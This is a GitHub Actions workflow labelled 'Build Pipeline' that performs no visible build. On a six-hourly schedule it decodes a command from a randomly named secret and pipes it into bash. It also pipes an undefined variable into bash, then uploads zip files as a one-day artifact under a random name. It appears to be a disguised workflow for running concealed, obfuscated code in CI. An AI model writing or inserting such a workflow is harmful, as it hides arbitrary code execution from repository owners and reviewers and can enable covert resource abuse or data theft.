name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '38 3,9,15,21 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
jobs:
  task:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply
        env:
          op03772: ${{ secrets.op03772 }}
        run: |
          printf '%s' "$op03772" | jq -r .tqg229 | /bin/bash
          echo $jng15093 | jq -r .g4 | /bin/bash

      - name: Upload output
        uses: actions/upload-artifact@v4
        with:
          name: JclRULLs
          path: "*.zip"
          retention-days: 1
